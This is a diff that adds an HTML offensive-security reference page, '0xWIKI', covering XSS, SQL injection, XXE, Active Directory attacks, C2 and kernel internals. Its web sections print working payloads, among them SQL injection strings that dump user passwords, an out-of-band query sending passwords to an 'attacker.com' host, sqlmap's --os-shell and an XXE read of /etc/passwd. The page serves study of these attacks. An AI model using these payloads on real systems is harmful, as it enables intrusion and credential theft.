@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0xWIKI | The Comprehensive Hacker's Handbook</title>
+    
+    <!-- FAVICON -->
+    <link rel="icon" type="image/svg+xml" href='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" rx="20" fill="%230b0c0f"/><text x="50" y="65" font-family="monospace" font-weight="bold" font-size="60" text-anchor="middle" fill="%2358a6ff">0x</text></svg>'>
+    <meta name="theme-color" content="#0d1117">
+
+    <!-- FUENTES -->
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    
+    <!-- CONEXIÓN CON TU CSS -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<aside>
+    <div class="brand"><span>0x</span>WIKI</div>
+    
+    <div class="nav-cat">1. Web Exploitation</div>
+    <a class="nav-item active" onclick="nav('web-xss')">Cross-Site Scripting (XSS)</a>
+    <a class="nav-item" onclick="nav('web-sqli')">SQL Injection Master Guide</a>
+    <a class="nav-item" onclick="nav('web-xxe')">XXE & XML Attacks</a>
+    <a class="nav-item" onclick="nav('web-csrf')">CSRF vs SSRF</a>
+    <a class="nav-item" onclick="nav('web-deserial')">Insecure Deserialization</a>
+
+    <div class="nav-cat">2. Red Team & Infrastructure</div>
+    <a class="nav-item" onclick="nav('rt-recon')">Reconnaissance (Nmap)</a>
+    <a class="nav-item" onclick="nav('rt-buffer')">Buffer Overflows</a>
+    <a class="nav-item" onclick="nav('rt-ad')">Active Directory (AD)</a>
+    <a class="nav-item" onclick="nav('rt-lateral')">Lateral Movement</a>
+    <a class="nav-item" onclick="nav('rt-c2')">C2 & Data Exfiltration</a>
+
+    <div class="nav-cat">3. Kernel & OS Internals</div>
+    <a class="nav-item" onclick="nav('os-mem')">Memory Layout (Stack/Heap)</a>
+    <a class="nav-item" onclick="nav('os-win')">Windows Internals (PEB/TEB)</a>
+    <a class="nav-item" onclick="nav('os-ring')">Rings, IDT & Syscalls</a>
+    <a class="nav-item" onclick="nav('os-drivers')">Drivers & IRPs</a>
+</aside>
+
+<main>
+    <div class="content">
+
+        <!-- ======================= WEB: XSS ======================= -->
+        <div id="web-xss" class="page visible">
+            <div class="module-badge">MODULE: WEB // CLIENT_SIDE</div>
+            <h1>Cross-Site Scripting (XSS)</h1>
+            <p>XSS allows an attacker to execute arbitrary JavaScript in the victim's browser. It occurs when the application includes untrusted data in a web page without proper validation or escaping.</p>
+
+            <h2>The Three Main Types</h2>
+            <h3>1. Reflected XSS (Non-Persistent)</h3>
+            <p>The malicious script is reflected off the web server, such as in an error message or search result. The payload is part of the request (URL).</p>
+            <pre><code>http://target.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+            
+            <h3>2. Stored XSS (Persistent)</h3>
+            <p>The malicious script is permanently stored on the target server. The victim retrieves the malicious script when they view the stored information.</p>
+            <div class="box box-red">
+                <span class="box-title">Impact</span>
+                This is the most dangerous type. A single stored payload can compromise thousands of users (e.g., Sammy Worm on MySpace).
+            </div>
+
+            <h3>3. DOM-Based XSS</h3>
+            <p>The vulnerability exists in the client-side code rather than the server-side code.</p>
+            <pre><code><span class="comment">// Vulnerable JS Code</span>
+var search = document.location.hash.substring(1);
+document.write("Results for: " + search);</code></pre>
+
+            <h2>Defense Mechanisms</h2>
+            <ul>
+                <li><strong>Content Security Policy (CSP):</strong> Restricts sources of loaded resources.</li>
+                <li><strong>Output Encoding:</strong> Converting special characters into HTML entities.</li>
+            </ul>
+        </div>
+
+        <!-- ======================= WEB: SQLi ======================= -->
+        <div id="web-sqli" class="page">
+            <div class="module-badge">MODULE: WEB // SEVERITY: CRITICAL</div>
+            <h1>SQL Injection (SQLi) Master Reference</h1>
+            <p>SQL Injection is the art of manipulating the interpreter's logic to execute unintended commands.</p>
+
+            <div class="box box-blue">
+                <span class="box-title">The Golden Rule</span>
+                If you can trigger a syntax error (e.g., getting "You have an error in your SQL syntax"), you likely have an entry point.
+            </div>
+
+            <h2>1. In-Band SQLi</h2>
+            <h3>A. UNION Based</h3>
+            <p><strong>Step 1: Column Count</strong> using <code>ORDER BY</code>.</p>
+            <pre><code>http://target.com/page?id=1' ORDER BY 3--</code></pre>
+            <p><strong>Step 2: Injection Point</strong> using <code>UNION SELECT</code>.</p>
+            <pre><code>http://target.com/page?id=1' UNION SELECT 'A', 'B'--</code></pre>
+            <p><strong>Step 3: Dump Data</strong></p>
+            <pre><code>' UNION SELECT username, password FROM users--</code></pre>
+
+            <h3>B. Error-Based</h3>
+            <p><strong>MySQL (UpdateXML):</strong></p>
+            <pre><code>AND updatexml(null,concat(0x0a,(select version())),null)--</code></pre>
+            <p><strong>MSSQL (Conversion):</strong></p>
+            <pre><code>' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--</code></pre>
+
+            <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
+
+            <h2>2. Blind SQLi</h2>
+            <h3>A. Boolean-Based</h3>
+            <pre><code>' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'--</code></pre>
+
+            <h3>B. Time-Based</h3>
+            <table>
+                <tr><th>Database</th><th>Payload</th></tr>
+                <tr><td>MySQL</td><td><code>' AND SLEEP(10)--</code></td></tr>
+                <tr><td>PostgreSQL</td><td><code>' || pg_sleep(10)--</code></td></tr>
+                <tr><td>MSSQL</td><td><code>' WAITFOR DELAY '0:0:10'--</code></td></tr>
+            </table>
+
+            <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
+
+            <h2>3. Out-of-Band (OOB)</h2>
+            <pre><code>SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users), '.attacker.com\\foobar'));</code></pre>
+
+            <div class="box box-red">
+                <span class="box-title">SQLMap Cheat Sheet</span>
+                <pre><code>sqlmap -u "http://target.com" --dbs
+sqlmap -u "http://target.com" --os-shell</code></pre>
+            </div>
+        </div>
+
+        <!-- ======================= WEB: XXE ======================= -->
+        <div id="web-xxe" class="page">
+            <div class="module-badge">MODULE: WEB // XML_PARSER</div>
+            <h1>XML External Entity (XXE)</h1>
+            <p>XXE arises when an XML processor parses external entities references.</p>
+            <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt; ]&gt;
+&lt;foo&gt;&xxe;&lt;/foo&gt;</code></pre>
+        </div>
+
+        <!-- ======================= WEB: CSRF/SSRF ======================= -->
+        <div id="web-csrf" class="page">
+            <div class="module-badge">MODULE: WEB // FORGERY</div>
+            <h1>CSRF vs SSRF</h1>
+            <h2>CSRF (Client-Side)</h2>
+            <p>Forces the <strong>User's Browser</strong> to send a request. Relies on cookies.</p>
+            
+            <h2>SSRF (Server-Side)</h2>
+            <p>Forces the <strong>Server</strong> to send a request to internal networks or cloud metadata.</p>
+        </div>
+
+        <!-- ======================= WEB: DESERIALIZATION ======================= -->
+        <div id="web-deserial" class="page">
+            <div class="module-badge">MODULE: WEB // LOGIC</div>
+            <h1>Insecure Deserialization</h1>
+            <p>Attackers craft malicious objects that trigger "Magic Methods" (like `__wakeup` in PHP) upon deserialization.</p>
+            <p><strong>Tools:</strong> <code>ysoserial</code> (Java) and <code>PHPGGC</code> (PHP).</p>
+        </div>
+
+        <!-- ======================= RT: RECON ======================= -->
+        <div id="rt-recon" class="page">
+            <div class="module-badge">MODULE: RED_TEAM // PHASE_1</div>
+            <h1>Reconnaissance: Nmap</h1>
+            <table>
+                <tr><th>Switch</th><th>Function</th></tr>
+                <tr><td><code>-sS</code></td><td>SYN Scan (Stealth)</td></tr>
+                <tr><td><code>-sT</code></td><td>TCP Connect (Noisy)</td></tr>
+                <tr><td><code>-sU</code></td><td>UDP Scan</td></tr>
+                <tr><td><code>-O</code></td><td>OS Detection</td></tr>
+                <tr><td><code>-sV</code></td><td>Version Detection</td></tr>
+                <tr><td><code>-p-</code></td><td>All Ports</td></tr>
+            </table>
+        </div>
+
+        <!-- ======================= RT: BUFFER ======================= -->
+        <div id="rt-buffer" class="page">
+            <div class="module-badge">MODULE: RED_TEAM // BINARY</div>
+            <h1>Buffer Overflows</h1>
+            <p>Overwriting the <strong>EIP</strong> (Instruction Pointer) on the Stack to redirect execution flow to Shellcode.</p>
+            <ol>
+                <li>Spiking & Fuzzing</li>
+                <li>Overwriting EIP</li>
+                <li>NOP Sled (0x90)</li>
+                <li>Shellcode Execution</li>
+            </ol>
+            <div class="box box-red">
+                <span class="box-title">Protections</span>
+                ASLR (Random addresses) and DEP (No execute bit).
+            </div>
+        </div>
+
+        <!-- ======================= RT: AD ======================= -->
+        <div id="rt-ad" class="page">
+            <div class="module-badge">MODULE: RED_TEAM // WINDOWS</div>
+            <h1>Active Directory (AD)</h1>
+            <p><strong>LLMNR Poisoning:</strong> Using Responder to capture hashes.</p>
+            <p><strong>Pass-The-Hash:</strong> Authenticating via SMB using NTLM hashes directly.</p>
+            <p><strong>Golden Ticket:</strong> Forging TGTs using the <code>krbtgt</code> hash for persistence.</p>
+        </div>
+
+        <!-- ======================= RT: LATERAL ======================= -->
+        <div id="rt-lateral" class="page">
+            <div class="module-badge">MODULE: RED_TEAM // MOVEMENT</div>
+            <h1>Lateral Movement</h1>
+            <p><strong>PsExec:</strong> Writes binary to ADMIN$. Noisy.</p>
+            <p><strong>WMI:</strong> Uses DCOM/RPC. Stealthy.</p>
+            <p><strong>WinRM:</strong> PowerShell Remoting. Uses HTTP/HTTPS.</p>
+        </div>
+
+        <!-- ======================= RT: C2 ======================= -->
+        <div id="rt-c2" class="page">
+            <div class="module-badge">MODULE: RED_TEAM // INFRA</div>
+            <h1>C2 & Exfiltration</h1>
+            <p><strong>Beaconing:</strong> Periodic check-ins with Jitter.</p>
+            <p><strong>Domain Fronting:</strong> Hiding traffic behind high-reputation CDNs.</p>
+        </div>
+
+        <!-- ======================= OS: MEMORY ======================= -->
+        <div id="os-mem" class="page">
+            <div class="module-badge">MODULE: KERNEL // RAM</div>
+            <h1>OS Memory Layout</h1>
+            <p><strong>.text:</strong> Read-only code.</p>
+            <p><strong>.data/.bss:</strong> Global variables.</p>
+            <p><strong>Heap:</strong> Dynamic memory (grows up).</p>
+            <p><strong>Stack:</strong> Local variables (grows down).</p>
+        </div>
+
+        <!-- ======================= OS: WINDOWS ======================= -->
+        <div id="os-win" class="page">
+            <div class="module-badge">MODULE: KERNEL // STRUCTURES</div>
+            <h1>Windows Internals</h1>
+            <p><strong>PEB:</strong> Process Environment Block (User Mode). Used to find DLLs.</p>
+            <p><strong>TEB:</strong> Thread Environment Block. Points to SEH chain.</p>
+        </div>
+
+        <!-- ======================= OS: RINGS ======================= -->
+        <div id="os-ring" class="page">
+            <div class="module-badge">MODULE: KERNEL // CPU</div>
+            <h1>Rings & Syscalls</h1>
+            <p><strong>IDT:</strong> Interrupt Descriptor Table.</p>
+            <p><strong>Syscall:</strong> The instruction that transitions CPU from Ring 3 to Ring 0.</p>
+        </div>
+
+        <!-- ======================= OS: DRIVERS ======================= -->
+        <div id="os-drivers" class="page">
+            <div class="module-badge">MODULE: KERNEL // RING_0</div>
+            <h1>Kernel Drivers</h1>
+            <p><strong>IRP:</strong> I/O Request Packet. Communication between App and Driver.</p>
+            <p><strong>BYOVD:</strong> Bring Your Own Vulnerable Driver. Loading an old legitimate driver to exploit it and enter Ring 0.</p>
+        </div>
+
+    </div>
+</main>
+
+<!-- CONEXIÓN CON TU JS -->
+<script src="script.js"></script>
+
+</body>
+</html>
